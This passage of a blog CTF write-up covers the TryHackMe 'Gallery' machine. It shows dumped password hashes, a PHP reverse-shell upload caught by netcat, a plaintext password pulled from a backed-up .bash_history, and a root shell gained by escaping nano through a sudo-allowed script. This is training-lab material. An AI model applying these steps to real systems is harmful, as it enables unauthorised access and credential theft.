+<span style=color:#f92672>|</span> <span style=color:#ae81ff>1</span>  <span style=color:#f92672>|</span> <span style=color:#ae81ff>1</span>    <span style=color:#f92672>|</span> uploads<span style=color:#f92672>/</span><span style=color:#ae81ff>1629883080_1624240500</span>_avatar<span style=color:#f92672>.</span>png <span style=color:#f92672>|</span> Admin    <span style=color:#f92672>|</span> <span style=color:#ae81ff>0</span>f18fd4cf40bfb1dec646807c7fa5522 (lmao) <span style=color:#f92672>|</span> admin    <span style=color:#f92672>|</span> Adminstrator <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span><span style=color:#f92672>-</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>02</span>:<span style=color:#ae81ff>37</span> <span style=color:#f92672>|</span> NULL       <span style=color:#f92672>|</span> <span style=color:#ae81ff>2022</span><span style=color:#f92672>-</span><span style=color:#ae81ff>02</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>08</span>:<span style=color:#ae81ff>55</span>:<span style=color:#ae81ff>43</span> <span style=color:#f92672>|</span>
+<span style=color:#f92672>+----+------+------------------------------------------+----------+-----------------------------------------+----------+--------------+---------------------+------------+---------------------+</span>
+</code></pre></div><p>That password&mldr; isn&rsquo;t that the very password that I set earlier? It it the answer to a THM question? Was I not supposed to change it?</p>
+<p>As a result, I had to restart the machine and run the exact command once again.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>Database: gallery_db
+Table: users
+[<span style=color:#ae81ff>1</span> entry]
+<span style=color:#f92672>+----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+</span>
+<span style=color:#f92672>|</span> id <span style=color:#f92672>|</span> type <span style=color:#f92672>|</span> avatar                                   <span style=color:#f92672>|</span> lastname <span style=color:#f92672>|</span> password                         <span style=color:#f92672>|</span> username <span style=color:#f92672>|</span> firstname    <span style=color:#f92672>|</span> date_added          <span style=color:#f92672>|</span> last_login <span style=color:#f92672>|</span> date_updated        <span style=color:#f92672>|</span>
+<span style=color:#f92672>+----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+</span>
+<span style=color:#f92672>|</span> <span style=color:#ae81ff>1</span>  <span style=color:#f92672>|</span> <span style=color:#ae81ff>1</span>    <span style=color:#f92672>|</span> uploads<span style=color:#f92672>/</span><span style=color:#ae81ff>1629883080_1624240500</span>_avatar<span style=color:#f92672>.</span>png <span style=color:#f92672>|</span> Admin    <span style=color:#f92672>|</span> a228b12a08b6527e7978cbe5d914531c <span style=color:#f92672>|</span> admin    <span style=color:#f92672>|</span> Adminstrator <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span><span style=color:#f92672>-</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>02</span>:<span style=color:#ae81ff>37</span> <span style=color:#f92672>|</span> NULL       <span style=color:#f92672>|</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>08</span><span style=color:#f92672>-</span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>18</span>:<span style=color:#ae81ff>12</span> <span style=color:#f92672>|</span>
+<span style=color:#f92672>+----+------+------------------------------------------+----------+----------------------------------+----------+--------------+---------------------+------------+---------------------+</span>
+</code></pre></div><h2 id=iii-cme-attack---reverse-shell>III. CME attack - reverse shell<a hidden class=anchor aria-hidden=true href=#iii-cme-attack---reverse-shell>#</a></h2>
+<span style=color:#696969><strong>tl;dr:</strong> Upload PHP reverse shell, got reverse shell</span>
+<p>This one was disappointingly facile. There was an option to upload the image in the web app, so I tried to upload a standard PHP reverse shell from <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>Pentest Monkey</a>. Then open the image.</p>
+<p>Strangely, my long-waited <em>netcat</em> listener received a call back.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ id
+uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=iv-privilege-escalation---user>IV. Privilege escalation - user<a hidden class=anchor aria-hidden=true href=#iv-privilege-escalation---user>#</a></h2>
+<span style=color:#696969><strong>tl;dr:</strong> Escalate to user privilege using credentials in .bash_history</span>
+<p>Yes, as you have just read. This fictional user foolishly typed his password into a bash command. You just need to look for it in a back up.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ find / -name <span style=color:#e6db74>&#34;*backup*&#34;</span> 2&gt;/dev/null <span style=color:#75715e># One of the top commands you should run when you get a shell</span>
+usr/src/linux-headers-4.15.0-167-generic/include/config/wm831x/backup.h
+/usr/src/linux-headers-4.15.0-154-generic/include/config/wm831x/backup.h
+/etc/lvm/backup
+/var/backups
+</code></pre></div><p>Apparently, we see to <code>/var/backups</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls /var/backups
+apt.extended_states.0
+apt.extended_states.1.gz
+apt.extended_states.2.gz
+apt.extended_states.3.gz
+mike_home_backup
+</code></pre></div><p>What&rsquo;s there in <code>mike_home_backup</code> directory?</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls /var/backups/mike_home_backup
+accounts.txt
+</code></pre></div><p>Interestingly, this <code>accounts.txt</code> file is just a trap.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=color:#960050;background-color:#1e0010>$</span> cat accounts<span style=color:#f92672>.</span>txt
+<span style=color:#66d9ef>Spotify</span> : mike@gmail<span style=color:#f92672>.</span>com<span style=color:#e6db74>:mycat666</span>
+<span style=color:#66d9ef>Netflix</span> : mike@gmail<span style=color:#f92672>.</span>com:<span style=color:#ae81ff>123456789</span>pass
+<span style=color:#e6db74>TryHackme</span>: <span style=color:#e6db74>mike</span>:darkhacker123
+</code></pre></div><p>Ther real credentials lies at <code>/var/backups/mike_home_backup/.bash_history</code>, right here:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat /var/backups/mike_home_backup/.bash_history
+cat .bash_history
+cd ~
+ls
+ping 1.1.1.1
+cat /home/mike/user.txt
+cd /var/www/
+ls
+cd html
+ls -al
+cat index.html
+sudo -lb3stpassw0rdbr0xx
+clear
+sudo -l
+exit
+</code></pre></div><p>See? His password was <code>b3stpassw0rdbr0xx</code>. Now run <code>su mike</code>, enter the password, and see what&rsquo;s left.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mike@gallery:/var/backups/mike_home_backup$ id
+id
+uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>mike<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=v-privilege-escalation---root>V. Privilege Escalation - root<a hidden class=anchor aria-hidden=true href=#v-privilege-escalation---root>#</a></h2>
+<span style=color:#696969><strong>tl;dr:</strong> Exploit a script that user can run as root</span>
+<p>A second in and I immediately know where to look to:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby>mike@gallery<span style=color:#e6db74>:/</span>var<span style=color:#f92672>/</span>backups<span style=color:#f92672>/</span>mike_home_backup<span style=color:#960050;background-color:#1e0010>$</span> sudo <span style=color:#f92672>-</span>l
+sudo <span style=color:#f92672>-</span>l
+<span style=color:#66d9ef>Matching</span> <span style=color:#66d9ef>Defaults</span> entries <span style=color:#66d9ef>for</span> mike on <span style=color:#e6db74>gallery</span>:
+    env_reset, mail_badpass,
+    secure_path<span style=color:#f92672>=</span><span style=color:#e6db74>/usr/</span>local<span style=color:#f92672>/</span>sbin\<span style=color:#e6db74>:/</span>usr<span style=color:#f92672>/</span>local<span style=color:#f92672>/</span>bin\<span style=color:#e6db74>:/</span>usr<span style=color:#f92672>/</span>sbin\<span style=color:#e6db74>:/</span>usr<span style=color:#f92672>/</span>bin\<span style=color:#e6db74>:/</span>sbin\<span style=color:#e6db74>:/</span>bin\<span style=color:#e6db74>:/</span>snap<span style=color:#f92672>/</span>bin
+
+<span style=color:#66d9ef>User</span> mike may run the following commands on <span style=color:#e6db74>gallery</span>:
+    (root) <span style=color:#e6db74>NOPASSWD</span>: <span style=color:#e6db74>/bin/</span>bash <span style=color:#e6db74>/opt/</span>rootkit<span style=color:#f92672>.</span>sh
+</code></pre></div><p>So we can run <em><code>/opt/rootkit.sh</code></em> as root. By the way, we can also read it:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
+</span><span style=color:#75715e></span>
+read -e -p <span style=color:#e6db74>&#34;Would you like to versioncheck, update, list or read the report ? &#34;</span> ans;
+
+<span style=color:#75715e># Execute your choice</span>
+<span style=color:#66d9ef>case</span> $ans in
+    versioncheck<span style=color:#f92672>)</span>
+        /usr/bin/rkhunter --versioncheck ;;
+    update<span style=color:#f92672>)</span>
+        /usr/bin/rkhunter --update;;
+    list<span style=color:#f92672>)</span>
+        /usr/bin/rkhunter --list;;
+    read<span style=color:#f92672>)</span>
+        /bin/nano /root/report.txt;;
+    *<span style=color:#f92672>)</span>
+        exit;;
+<span style=color:#66d9ef>esac</span>
+</code></pre></div><p>Seems like a script to check for rootkit. Ironically, the script to check for rootkit is a rootkit itself.</p>
+<p>Take a look at that <code>read</code> option, do you see that we can run <code>nano</code> as <em><strong>root</strong></em>? According to <a href=https://gtfobins.github.io/gtfobins/nano/#shell>GTFOBins</a>, that much is enough to break out and get a shell.</p>
+<p>
+<img src=/img/gallery/gtfobin.png#center alt>
+</p>
+<p>Type exactly that, character-by-character, we broke out of <code>nano</code> and got the root shell.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown># id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+report.txt  root.txt
+</code></pre></div><p>And that&rsquo;s all. A pretty basic challenge. Hope you&rsquo;ve enjoyed it!</p>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li>
+<li><a href=https://git-akihakune.github.io/tags/thm/>thm</a></li>
+<li><a href=https://git-akihakune.github.io/tags/tech/>tech</a></li>
+</ul>
+<nav class=paginav>
+<a class=next href=https://git-akihakune.github.io/blog/driver/>
+<span class=title>Next Page »</span>
+<br>
+<span>Hack The Box - Driver</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Gallery on twitter" href="https://twitter.com/intent/tweet/?text=Try%20Hack%20Me%20-%20Gallery&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fgallery%2f&hashtags=ctf%2cthm%2ctech"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Gallery on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fgallery%2f&title=Try%20Hack%20Me%20-%20Gallery&summary=Try%20Hack%20Me%20-%20Gallery&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fgallery%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Gallery on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fgallery%2f&title=Try%20Hack%20Me%20-%20Gallery"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Gallery on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fgallery%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Gallery on whatsapp" href="https://api.whatsapp.com/send?text=Try%20Hack%20Me%20-%20Gallery%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fgallery%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Gallery on telegram" href="https://telegram.me/share/url?text=Try%20Hack%20Me%20-%20Gallery&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fgallery%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer><script src=https://utteranc.es/client.js repo=git-akihakune/git-akihakune.github.io issue-term=pathname theme=photon-dark crossorigin=anonymous async></script>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2022 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
+- Aki Hakune
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
+<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:'rgba(0, 0, 0, 0.8)'})})</script>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
